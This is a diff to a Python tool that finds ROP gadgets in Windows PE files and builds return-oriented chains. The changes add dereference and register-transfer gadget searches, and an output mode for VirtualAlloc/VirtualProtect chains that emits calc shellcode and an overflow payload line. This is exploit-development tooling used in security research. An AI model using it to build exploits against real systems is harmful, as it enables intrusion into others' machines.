@@ -51,6 +51,8 @@ except Exception as e:
 	# from ui import *
 import colorama
 
+excludeRegsGlobal =[]
+
 conFile = str("config.cfg")
 configOptions={}
 
@@ -222,6 +224,7 @@ def findEvilImports(myPE):
 	# 	dp(hex(address))
 	# except:
 	# 	dp ("kernel32 is not there")
+
 def Extraction():
 	global o
 	# global modName
@@ -271,6 +274,8 @@ def Extraction():
 				pe[n].setVSize(myPE.sections[t].Misc_VirtualSize)		
 				pe[n].setSizeOfRawData(myPE.sections[t].SizeOfRawData)		
 				pe[n].setStartLoc(myPE.sections[t].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
+				pe[n].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
+
 				pe[n].setEndAddy(myPE.sections[t].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[t].Misc_VirtualSize)		
 				pe[n].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
 				pe[n].setSectionName(stripWhite(myPE.sections[t].Name.decode()))		
@@ -283,7 +288,9 @@ def Extraction():
 				pe[n].setVirtualAdd(myPE.sections[0].VirtualAddress)		
 				pe[n].setVSize(myPE.sections[0].Misc_VirtualSize)		
 				pe[n].setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
-				pe[n].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
+				pe[n].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)	
+				pe[n].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
+
 				pe[n].setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
 				pe[n].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
 				pe[n].setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
@@ -438,7 +445,9 @@ def extractDLLsEach(dll):
 		pe[dll].setMagic(myPE.OPTIONAL_HEADER.Magic)
 		pe[dll].setVSize(myPE.sections[0].Misc_VirtualSize)		
 		pe[dll].setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
-		pe[dll].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
+		pe[dll].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)
+		pe[dll].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
+
 		pe[dll].setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
 		pe[dll].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
 		pe[dll].setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
@@ -484,6 +493,8 @@ def extractDLLsEachParallel(args):
 		newPE.setVSize(myPE.sections[0].Misc_VirtualSize)		
 		newPE.setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
 		newPE.setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
+		newPE.setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
+
 		newPE.setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
 		newPE.setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
 		newPE.setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
@@ -4108,7 +4119,7 @@ def disHereClean3(address, valCount, numBytes, mode):
 	val3 = []
 	address2 = address + m[o].startLoc + 1000
 
-	#now2
+
 	for i in cs.disasm(CODED2, address-numBytes):
 		add = hex(int(i.address))
 		addb = hex(int(i.address +  m[o].VirtualAdd))
@@ -4780,7 +4791,7 @@ def rop_testerFindClobberFree(myDict, excludeRegs,bad, c3,espDesiredMovement, fi
 				dp("ignoring prevEm results")
 				outEmObj=rop_tester(myDict[addy].raw, hex(addy)+"  2")
 				myDict[addy].setRegsObj(outEmObj)
-			outEmObj.show()
+			# outEmObj.show()
 			freeOfClobbering=outEmObj.checkForBad(excludeRegs, espDesiredMovement)  #-4 esp desirved movement  = push -4
 			if not freeOfClobbering:
 				dp ("not free of Clobbering, hit the continue")
@@ -4925,7 +4936,7 @@ def rop_testerFindClobberFreeRegRegOld(myDict, excludeRegs, bad,c3,espDesiredMov
 	return False, 0,0,dumb
 
 def findGeneric(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
-	dp ("findGeneric", instruction, reg)
+	# print ("findGeneric", instruction, reg)
 	bExists, myDict=fg.getFg(instruction,reg)
 	if bExists:
 		dp ("it exists")
@@ -4935,7 +4946,7 @@ def findGeneric(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
 
 				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
 				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
-					dp ("found ",instruction, reg) 
+					# print ("found ",instruction, reg) 
 					return True,p
 			return False,0
 		if not length1: # was else
@@ -4958,6 +4969,40 @@ def findGeneric(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
 		# dp ("return false ", instruction)
 		return False,0
 
+
+def findGenericC2AgnosticJmpCall(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
+	# print ("findGeneric", instruction, reg)
+	bExists, myDict=fg.getFg(instruction,reg)
+	if bExists:
+		dp ("it exists")
+		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
+			for p in myDict:
+				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
+
+				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
+				if myDict[p].length ==1 and freeBad:
+					# print ("found ",instruction, reg) 
+					return True,p
+			return False,0
+		if not length1: # was else
+			for p in myDict:
+				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
+
+				freeBad=False
+				if myDict[p].length ==1 and freeBad:
+					dp ("found ", instruction, reg)
+					return True,p, myDict
+				dp (instruction," clob")
+				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
+				if mdExist:
+					dp ("found alt", instruction, reg)
+					return True,m1
+				else:
+					return False,0
+	else:
+		dp ("it does not exist")
+		# dp ("return false ", instruction)
+		return False,0
 def findNegOrNot(reg,bad,length1, excludeRegs,espDesiredMovement, comment=None):
 	dp ("findNegOrNot", reg)
 	foundNe, ne1 = findGeneric("neg",reg,bad,length1, availableRegs,espDesiredMovement)
@@ -5284,7 +5329,6 @@ def findMovDeref(reg,op2,bad,length1, excludeRegs,espDesiredMovement=0):
 											c2Amt=int(c2Ret[1])
 									stackPivotAmount=stackPivotAmount+c2Amt
 									return True, p, stackPivotAmount
-									# exit()
 									# return True,p, stackPivotAmount
 						# 		else:
 						# 			print(blu,"   not verifyValSame",res)
@@ -5305,7 +5349,138 @@ def printDict(myDict):
 			pk.extend([p])
 		t+=1
 	showChain(pk)
-def findMovDeref2(reg,op2,bad,length1, excludeRegs,espDesiredMovement=0):
+
+def findMovDerefLeftJustOneLoad(reg,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
+	# print("findMovDerefLeftJustOne", reg)
+	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
+	bFind, pk=findMovDerefLeftSingle(reg,bad,length1, excludeRegs,comment,espDesiredMovement)
+	if bFind:
+		foundP2, p2, chP = loadReg(reg,bad,length1,excludeRegs,val,comment,False,"test")
+		if foundP2:
+			pk=pkBuild([chP,pk])
+			return bFind,pk
+		return True, pk
+
+	for r in excludeRegs:
+		availableRegs.remove(r)
+	for r in availableRegs:
+		# print (r)
+		bFind, pk=findMovDerefLeft(reg,r,bad,length1, excludeRegs,comment,espDesiredMovement)
+		if bFind:
+			foundP2, p2, chP = loadReg(r,bad,length1,excludeRegs,val,comment,False,"test")
+			if foundP2:
+				pk=pkBuild([chP,pk])
+				return bFind,pk
+	return False, 0
+def findMovDerefLeftLoadReg1(reg1,reg2,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
+	print("findMovDerefLeftLoadReg1", reg1,reg2)
+	excludeRegs.append(reg1)
+	excludeRegs.append(reg2)
+
+
+	bFind, pk=findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
+	if bFind:
+		excludeRegs.append(reg1)
+		foundP2, p2, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment,False,"test")
+		if foundP2:
+			pk=pkBuild([chP,pk])
+			return bFind,pk
+	return False, 0
+
+def findMovDerefLeftLoadReg2(reg1,reg2,val, bad,length1, excludeRegs,comment,espDesiredMovement=0):
+	print("findMovDerefLeftLoadReg2", reg1,reg2)
+	try:
+		excludeRegs2=set(excludeRegs)
+		if  reg1 not in excludeRegs2:
+			excludeRegs.append(reg1)
+		if  reg1 not in excludeRegs2:
+			excludeRegs.append(reg2)
+
+		bFind, pk=findMovDerefLeftSingle(reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
+		print (32,excludeRegsGlobal )
+
+		if bFind:
+			foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,val,comment,False,"test")
+			print (33,excludeRegsGlobal )
+			
+			if foundP2:
+				pk=pkBuild([chP,pk])
+				return bFind,pk
+			return True, pk
+
+		print (4,excludeRegsGlobal )
+
+		bFind2, pk=findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement)
+		if bFind2:
+			print (5,excludeRegsGlobal )
+			
+			foundP2, p2, chP = loadReg(reg2,bad,length1,excludeRegs,val,comment,False,"test")
+			if foundP2:
+				pk=pkBuild([chP,pk])
+				return bFind,pk
+		return False, 0
+	except Exception as e:
+		print ("findMovDerefLeftLoadReg2:")
+		print (e)
+		print(traceback.format_exc())
+
+def findMovDerefLeftJustOne(reg,bad,length1, excludeRegs,comment,espDesiredMovement=0):
+	print("findMovDerefLeftJustOne", reg)
+	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
+	bFind, pk=findMovDerefLeftSingle(reg,bad,length1, excludeRegs,comment,espDesiredMovement)
+	if bFind:
+		return True, pk
+
+	for r in excludeRegs:
+		availableRegs.remove(r)
+	for r in availableRegs:
+		print (r)
+		bFind, pk=findMovDerefLeft(reg,r,bad,length1, excludeRegs,comment,espDesiredMovement)
+		return bFind,pk
+	return False, 0
+
+#now
+
+def findMovDerefLeftSingle(reg1,bad,length1, excludeRegs2,comment,espDesiredMovement=0):
+	global excludeRegsGlobal
+	# print ("findMovDerefLeft", reg1)
+	foundM1, m1 = findMovDeref2(reg1,reg1,bad,length1, excludeRegs2,espDesiredMovement)
+
+	if foundM1:
+		# print ("have it", gre,disOffset(m1),res)
+		cM1=chainObj(m1, comment, [])
+
+		pk=pkBuild([cM1])
+		return True, pk
+	return False,0
+
+def findMovDerefLeft(reg1,reg2,bad,length1, excludeRegs,comment,espDesiredMovement=0):
+	# print ("findMovDerefLeft", reg1,reg2)
+
+	availableRegs={"eax", "ebx","ecx","edx", "esi","edi","ebp"}
+	for r in excludeRegs:
+		availableRegs.remove(r)
+	for r in availableRegs:
+		# print ("r", r)
+		foundM2, m2 = findMovDeref2(r,reg2,bad,length1, excludeRegs,espDesiredMovement)
+		if foundM2:
+			excludeRegs2= copy.deepcopy(excludeRegs)
+			excludeRegs2.append(reg1)
+			excludeRegs2.append(reg2)
+			foundT, gT = findUniTransfer(reg1,r, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +r+" to " + reg1 +  " - " +comment,True, True,True)
+			# foundT=False
+			if foundT:
+				# print (excludeRegs2)
+				pk=pkBuild([m2,gT])
+				# print (cya,"This is a good one2", reg1,reg2)
+				# showChain(pk,True)
+				# print(res)
+				return True, pk
+	return False,0
+
+		
+
+def findMovDeref2Old(reg,op2,bad,length1, excludeRegs,espDesiredMovement=0):
 	dp ("findMovDeref2:", reg, length1)
 	bExists, myDict=fg.getFg("movDword2",reg)
 	# dpDict(myDict)
@@ -5335,6 +5510,25 @@ def findMovDeref2(reg,op2,bad,length1, excludeRegs,espDesiredMovement=0):
 	else:
 		# dp ("return false findmovderef")
 		return False,0
+
+def findMovDeref2(reg1,reg2,bad,length1, excludeRegs,espDesiredMovement=0):
+	dp ("findMovDeref2:", reg1, length1)
+	# print ("findMovDeref2:", reg1,reg2, length1)
+	bExists, myDict=fg.getFg("movDword2",reg1)
+	# dpDict(myDict)
+	if bExists:
+		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
+			for p in myDict:
+				# print (disOffset(p))
+				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])
+
+				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad and fg.rop[p].op2=="dword ptr ["+reg2+"]":
+					# print (gre,"yes", fg.rop[p].op1, fg.rop[p].op2, res)
+				 # and fg.rop[p].op1==op2:
+					# print ("yes")
+					return True,p
+			return False,0
+	return False,0
 def findPush(reg,bad,length1, excludeRegs,espDesiredMovement=-4):
 	dp ("findPush:", reg, length1)
 	bExists, myDict=fg.getFg("push",reg)
@@ -5581,6 +5775,9 @@ def imgOld(p, myDict):
 	return img
 
 def img(p, fg2=None):
+	# print(mag, "img",res)
+	global fg  #not sure why global needed
+	img=p
 	try:
 		if 'gadgets.ropChainObj' in str(type(fg2[p])):  # lol not sure why a more straightforward comparison ddoesn't work for me
 			myChainDict=fg2
@@ -5588,10 +5785,13 @@ def img(p, fg2=None):
 			return img
 	except:
 		pass
-
 	if fg2==None: #could be needed if done with parallelization
 		global fg  #not sure why global needed
-		img=fg.rop[p].offset + pe[n].startLoc
+		try:
+			img=fg.rop[p].offset + pe[n].startLoc
+		except:
+			# print(red,"oh no", p, hex(p), pe[n].startLoc,res)
+			pass
 	else:
 		try:
 
@@ -5602,7 +5802,7 @@ def img(p, fg2=None):
 			print (hex(p))
 			return p
 	return img
-def showChain(myDict,printYes=False):
+def showChain(myDict,printYes=False,GiveText=False):
 	t=0
 	# for g in myDict:
 	# 	print (t,"\t",hex(myDict[t].g.offset), disMini(myDict[t].g.raw, myDict[t].g.offset), " # ", myDict[t].comment,"#",myDict[t].g.mod )
@@ -5635,7 +5835,22 @@ def showChain(myDict,printYes=False):
 				# if type(val)==tuple:
 				# 	dp (hex(val[0]), "\t",val[1],"oh my soul, it be a tuple!")
 			t=t+1
-
+	t=0
+	if GiveText:
+		txt=""
+		try:
+			for g in myDict:
+				txt+= str(t)+"\t" +  "0x"+str(hx (img(t,myDict), 8)) + " " + disMini(myDict[t].g.raw, myDict[t].g.offset) + " # "+		 myDict[t].comment +" # "+myDict[t].g.mod +"\n"
+				for val in (myDict[t].stack):
+					if type(val)==int:
+						txt+=  ("\t"+		hex(val)+"\n")
+					# if type(val)==tuple:
+					# 	print (hex(val[0]), "\t",val[1],"oh my soul, it be a tuple!")
+				t=t+1
+			return txt
+		except Exception as e:
+			print (e)
+			print(traceback.format_exc())
 # import io
 
 # def print_to_string(*args, **kwargs):
@@ -5716,7 +5931,7 @@ def genOutput(myDict, typePattern=None):
 	cOut+="\t]\n\n"
 	
 
-	if typePattern !=None and typePattern !="HG":
+	if typePattern !=None and typePattern !="HG"and typePattern !="VA"and typePattern !="VP" or typePattern =="V2A":
 		outP=genCode2(True)
 		outP+="startParams="+hex(dist)+"\n"
 		for s in myStrings:
@@ -5726,6 +5941,13 @@ def genOutput(myDict, typePattern=None):
 		for p in myParams:
 			outP+=p
 		outP+=genCode3(True)
+	elif typePattern=="VA" or typePattern=="VP":
+		outP=genCode2(True)
+		outP+=genCalcShellcode()
+		outP+="payload = (filler * 100) + ch + calc_shellcode\n"
+		outP+="# 100 - amount sufficient to achieve overflow, etc.\n"
+
+		outP+=genCode3(False)
 	else:
 		outP=genCode2(False)
 		outP+="payload = ch\n"
@@ -5829,7 +6051,10 @@ def buildIntOverflowPRTargetReg(excludeRegs,bad,goal,tThis, bb, withPR=True, reg
 		dp ("Got obfuscation values for integer oveflow:")
 		dp (hex(obf1), hex(obf2))
 	for reg in excludeRegs:
-		availableRegs.remove(reg)
+		try:
+			availableRegs.remove(reg)
+		except:
+			pass
 	espDesiredMovement=4
 	addEspMove=0
 	foundAdd,aP1,addD1,reg,reg2,addStackMov = findAddRegReg(regFirst,bad,availableRegs,excludeRegs, addEspMove)
@@ -6265,7 +6490,6 @@ def getHGandPops(hgExcludeRegs,excludeRegs,bad,availableRegs,pu1, destination):
 				package.extend(rdp2)
 				dp ("\n\npackage2")
 				showChain(package)
-				# exit()
 				return foundPops, package
 	
 
@@ -6276,7 +6500,6 @@ def getHGandPops(hgExcludeRegs,excludeRegs,bad,availableRegs,pu1, destination):
 	# addChain(p2, "second pop - going to a single push gadget ", [pu1], mList)
 	# addChain(p, "Double push heaven's gate gadget #2", [], mList)
 
-	# exit()
 	return False,[]
 def findAddTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
 	availableRegs={"eax","ebx","ecx","edx", "esi","edi","ebp"}
@@ -6291,7 +6514,7 @@ def findAddTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,commen
 	# print ("availableRegs",availableRegs)
 	foundM1, m1 = findGenericOp2("add",reg2,reg1,bad,length1, excludeRegs,espDesiredMovement)
 	if foundM1:
-		val=0xfffffff 
+		val=0xffffffff 
 		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment)
 		if foundP1:
 			foundInc, iP = findGeneric("inc",reg1,bad,length1, availableRegs,espDesiredMovement)
@@ -6412,11 +6635,10 @@ def findSubTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,commen
 								# print (cya,"This is a good one2", reg1,reg2)
 								# showChain(pk,True)
 								# print(res)
-								# exit()
 								return True, pk
 			
 			continueFlag2=True
-		return False,0
+	return False,0
 def findXorTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,comment):
 	# print (gre, "findXorTransfer", "reg1",reg1, "reg2",reg2, res)
 	if reg1==reg2:
@@ -6566,7 +6788,7 @@ def findXorTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,commen
 
 	foundM1, m1 = findGenericOp2("add",reg2,reg1,bad,length1, excludeRegs,espDesiredMovement)
 	if foundM1:
-		val=0xfffffff 
+		val=0xffffffff 
 		foundP1, p1, chP = loadReg(reg1,bad,length1,excludeRegs,val,comment)
 		if foundP1:
 			foundInc, iP = findGeneric("inc",reg1,bad,length1, availableRegs,espDesiredMovement)
@@ -6579,52 +6801,72 @@ def findXorTransfer(reg1,reg2, bad,length1,excludeRegs,espDesiredMovement,commen
 	return False,0
 def findUniTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment="", excludeXor=False,excludeXchg=False, excludeSub=False,excludePushPop=False,ID=None):
 	# print (red,"findTransfer", reg, op2,res)
-	if comment==None:
-		comment=""
-	# if 2==3 or excludeXor or excludeXchg or excludeSub or excludePushPop:
-	foundM1, m1 = findGenericOp2("mov",op2,reg,bad,length1, excludeRegs,espDesiredMovement)
-	if foundM1:
-		gM=chainObj(m1, comment, [])
-		package=[gM]
-		showChain(package)
-		return True, package
-	if not excludeXchg:
-		foundT, x1 = xchgMovReg(reg,op2, bad,length1,excludeRegs,espDesiredMovement)
-		if foundT:
-			gM=chainObj(x1, comment, [])
+	try:
+		if comment==None:
+			comment=""
+		# if 2==3 or excludeXor or excludeXchg or excludeSub or excludePushPop:
+		foundM1, m1 = findGenericOp2("mov",op2,reg,bad,length1, excludeRegs,espDesiredMovement)
+		if foundM1:
+			gM=chainObj(m1, comment, [])
 			package=[gM]
 			showChain(package)
 			return True, package
-	foundAT, gAT= findAddTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
-	if foundAT:
-		return True, gAT
-	
+		if not excludeXchg:
+			foundT, x1 = xchgMovReg(reg,op2, bad,length1,excludeRegs,espDesiredMovement)
+			if foundT:
+				gM=chainObj(x1, comment, [])
+				package=[gM]
+				showChain(package)
+				return True, package
+		foundAT, gAT= findAddTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
+		if foundAT:
+			return True, gAT
+		
 
-	if not excludeXor:
-			foundXT, gXT= findXorTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
-			if foundXT:
-				return True, gXT
+		if not excludeXor:
+				foundXT, gXT= findXorTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
+				if foundXT:
+					return True, gXT
 
-	if not excludeSub:
-		foundST, gST= findSubTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
-		if foundST:
-			return True, gST
-	# print ("Returning False")
-	if not excludePushPop:
-		foundMEsp, mEsp, stackPivotAmount = getPushPopReg(op2, reg,excludeRegs,espDesiredMovement)
-		if foundMEsp:
-			# print ("got one", op2)
-			if stackPivotAmount ==0:
-				cPuPo=chainObj(mEsp,  "Transfer "+op2 + " to " + reg, [])
-			else:
-				filler=genFiller(stackPivotAmount)
-				cPuPo=chainObj(mEsp,  "Transfer2 "+op2 + " to " + reg, filler)
-			cPuPo=pkBuild([cPuPo])
-			# showChain(cPuPo,True)
-			# if ID!=None:
-			# 	print ("ID: ", ID)
-			return True, cPuPo
-	return False, 0
+		if not excludeSub:
+			foundST, gST= findSubTransfer(reg,op2, bad,length1,excludeRegs,espDesiredMovement,comment)
+			if foundST:
+				return True, gST
+		
+		if not excludePushPop:
+			foundMEsp, mEsp, newReg,stackPivotAmount,c3Status,c2Adjust = getPushPopReg(op2, reg,excludeRegs,espDesiredMovement)	
+			if foundMEsp:
+				if stackPivotAmount ==0:
+					cPuPo=chainObj(mEsp,  "Transfer "+op2 + " to " + reg, [])
+				else:
+					filler=genFiller(stackPivotAmount)
+					cPuPo=chainObj(mEsp,  "Transfer2 "+op2 + " to " + reg, filler)
+				cPuPo=pkBuild([cPuPo])
+				return True, cPuPo
+			if not foundMEsp:
+				foundMEsp, mEsp, newReg,stackPivotAmount,c3Status,c2Adjust = getPushPopReg(op2, reg,excludeRegs,espDesiredMovement,False,False)
+				if foundMEsp:
+					foundT, gT4 = findUniTransfer(reg,newReg, bad,length1,excludeRegs,espDesiredMovement, "Transfer " +newReg+" to " + reg, True,True,True,False)
+					if foundT:
+						filler2=[]
+						if stackPivotAmount ==0:
+							cMEsp=chainObj(mEsp,  "Save esp to "+reg, [])
+							if c3Status!="c3":
+								cMEsp=chainObj(mEsp,  "Save esp to "+reg,[])
+								filler2=genFiller(c2Adjust)
+								gT4[0].modStackAddFirst(filler2)
+						else:
+							filler=genFiller(stackPivotAmount)
+							cMEsp=chainObj(mEsp,  "Save esp to "+reg, filler)
+							if c3Status!="c3":
+								filler2=genFiller(c2Adjust)
+						pk=pkBuild([cMEsp,gT4])
+						return True, pk
+		return False, 0
+	except Exception as e:
+		print ("exception - findUniTransfer", sysTarget)
+		print(e)
+		print(traceback.format_exc())
 def xchgMovReg(reg,op2, bad,length1,excludeRegs,espDesiredMovement):
 	dp ("xchgMovReg", reg, op2)
 	foundX, x1 = findXchg(reg,op2,bad,length1, excludeRegs,espDesiredMovement)
@@ -6657,7 +6899,6 @@ def lXorAdd(reg,val,bad,length1,excludeRegs,espDesiredMovement,isVal=False):
 				pk=pkBuild([x1,chP,a1])
 				dp ("pk",pk)
 				showChain(pk)
-				# exit()
 				return True, pk
 	return False,0x666
 
@@ -6743,7 +6984,6 @@ def findTripleTransfer(reg1, reg2,bad,length1,excludeRegs,espDesiredMovement, co
 						pkg=pkBuild([gT,gT2,gT3])
 						# showChain(pkg,True)
 						return True, pkg
-						# exit()
 	return False,0
 
 
@@ -6947,6 +7187,9 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 
 	if rValStr=="targetDllString":
 		FoundDistG, v, pk2,reg=getDistanceGadget(excludeRegs,rValStr,pk,reg,"loc1")
+	elif rValStr=="JmpESP":
+		val=img(val)
+
 	elif rValStr=="hModule":
 		# print ("hModule start")
 		availableRegs=["ebx","ecx","edx", "esi","edi","ebp"]
@@ -6998,7 +7241,9 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 			print ("  Need a mov dereference gadget.")
 			return False, 0,0,0
 
-
+	elif rValStr=="flOldProtect":
+		return found, 0, val,reg
+		
 	elif rValStr=="lpProcName":
 		rValStr2="targetDllString"
 
@@ -7015,6 +7260,13 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 		# outFile.write("About to do Loc2  " )
 		FoundDistG, v, pk2,reg=getDistanceGadget(excludeRegs,rValStr2,pk,reg,"loc3","System")
 		comment=" - get Command"
+	elif rValStr=="VPPtr2" or rValStr=="VAPtr2":
+		comment+=" - dereferencing the API"
+		bFind, pk=findMovDerefLeftJustOneLoad(reg,val,bad,length1, excludeRegs,comment,0)
+		if bFind:
+			return bFind, 0, pk,reg
+		else:
+			return False, 0,0,reg
 
 	try:
 		if hasImg[rValStr]:
@@ -7041,17 +7293,17 @@ def loadRegP(z,i, bad, length1,excludeRegs,pk,distEsp=0):
 	if rValStr=="skip":
 		return True, None, None,reg
 
-	foundP1, p1, chP = loadReg(reg,bad,length1,excludeRegs,val,comment2,False,"test")
 
 	if (rValStr=="targetDllString" or rValStr=="lpProcName" or rValStr=="Command") and FoundDistG:
 		return True, 0, pk2,reg
-
 	if rValStr=="hModule" or rValStr=="SystemPTR":
 		return True, 0, pkTransfer,reg		
+
+	foundP1, p1, chP = loadReg(reg,bad,length1,excludeRegs,val,comment2,False,"test")
 	if foundP1:
 		return foundP1, p1, chP,reg
 	else:
-		return False, 0,0,0
+		return False, 0,0,reg
 
 def loadRegEmu(reg,bad,length1,excludeRegs,val,comment=None):
 	foundP1, p1,pDict=findPop(reg,bad,length1,excludeRegs)
@@ -7067,7 +7319,11 @@ def loadRegEmu(reg,bad,length1,excludeRegs,val,comment=None):
 		return False, 0,0
 
 def findChangeESP(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distFinalESP, curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi=0):
+	# print ("sysTarget", sysTarget, PWinApi,targetP)
 	global stopDistanceEmu
+	global xy
+	xy=0
+
 	stopDistanceEmu=False
 	dp ("findChangeESP", reg, targetP, "numpP", numP)
 	foundAdd, package,packageb, packagec,dEsp,bYes,oldDESP = findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi, False,0)
@@ -7093,12 +7349,10 @@ def findChangeESP(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement,di
 
 prevDistFinalESP=0
 xy=0
-
-
 addEspAttempts=set()
 startPk=0
 pkMonitor=False
-
+finalPivotGadget=0xFFFFFFFF
 AddToESP=True
 def giveBoolAddToESP():
 	global AddToESP
@@ -7108,9 +7362,27 @@ def giveBoolAddToESP():
 		AddToESP=True
 	return AddToESP
 
-finalPivotGadget=0xFFFFFFFF
+
+
+def clearGlobals():
+	global stopDistanceEmu
+	global prevDistFinalESP
+	global xy
+	global startPk
+	global pkMonitor
+	global finalPivotGadget
+
+	xy=0
+	stopDistanceEmu=False
+	finalPivotGadget=0xFFFFFFFF
+	startPk=0
+	pkMonitor=False
+	prevDistFinalESP=0
+
+
 def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, distFinalESP,curPk,distEsp,destAfter,IncDec,numP,compensate,targetP,sysTarget,PWinApi=0,recurs=False, iD=0):
 	# print ("distFinalESP", distFinalESP, hex(distFinalESP))
+	# print (targetP,sysTarget,PWinApi,iD)
 	global stopDistanceEmu
 	global prevDistFinalESP
 	global xy
@@ -7123,7 +7395,7 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 	
 	if recurs:
 		prevDistFinalESP=distFinalESP
-	upperLimit=25
+	upperLimit=15
 	# distFinalESP=getDistanceParamReg(pe,n,curPk,distEsp,IncDec,numP,targetP, "esp", destAfter,PWinApi,sysTarget)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter   "winApi"
 	# oldDESP=distFinalESP
 	# if not recurs:
@@ -7144,6 +7416,7 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 	pkMonitor=True
 	AddToESP=True
 	for op2 in regsNotUsed:
+		foundAdd=False
 		continueFlag=False
 		if bYes:
 			break
@@ -7151,7 +7424,7 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 		# foundL1, p2, chP = loadReg(op2,bad,length1,excludeRegs,distFinalESP)
 		foundL1, p2, chP2 = loadReg(op2,bad,length1,excludeRegs,distFinalESP)
 		# if foundL1:
-			# print (red,"built loadReg", hex(distFinalESP),res)
+		# 	print (red,"built loadReg", hex(distFinalESP),res)
 		foundL1b, p2b, chP2b = loadReg(op2,bad,length1,excludeRegs,(distFinalESP+4))
 		foundL1c, p2c, chP2c = loadReg(op2,bad,length1,excludeRegs,(distFinalESP-4))
 
@@ -7165,6 +7438,9 @@ def findAddEsp(reg,bad,length1, excludeRegs,regsNotUsed,espDesiredMovement, dist
 		if foundL1 and foundAdd:
 			# print (foundAdd, a1)
 			finalPivotGadget=a1
+			# print (red,"finalPivotGadget", gre,a1, hex(a1),res)
+			# print (disOffset(a1))
+
 			cA=chainObj(a1, "Move esp to reach API", [])
 			# cP2=chainObj(p2, "Change value for esp", [distFinalESP])
 			# test2=[cP2,cA]
